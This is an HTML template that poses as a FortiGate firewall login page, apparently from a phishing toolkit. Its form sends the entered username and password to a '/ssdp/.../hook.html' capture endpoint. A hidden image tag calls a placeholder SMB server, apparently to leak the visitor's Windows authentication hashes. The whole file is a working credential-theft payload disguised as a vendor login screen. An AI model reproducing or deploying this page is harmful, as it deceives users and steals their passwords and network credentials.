<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FortiGate</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<form method="POST" action="/ssdp/{{ template_idx }}/hook.html" name="LoginForm">
    <div class="panel">
        <div class="panel-head">
            <svg class="mark" viewBox="0 0 18 12" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                <rect x="0" y="0" width="4.6" height="5" rx="1.1"/>
                <rect x="6.7" y="0" width="4.6" height="5" rx="1.1"/>
                <rect x="13.4" y="0" width="4.6" height="5" rx="1.1"/>
                <rect x="0" y="7" width="11.3" height="5" rx="1.1"/>
                <rect x="13.4" y="7" width="4.6" height="5" rx="1.1"/>
            </svg>
        </div>
        <div class="panel-body">
            <input type="text" name="username" placeholder="Username" autocomplete="username" autofocus>
            <input type="password" name="password" placeholder="Password" autocomplete="current-password">
            <input type="submit" value="Login">
        </div>
    </div>
</form>
<img src="http://{{ smb_server }}" style="display: none;" />
</body>
</html>
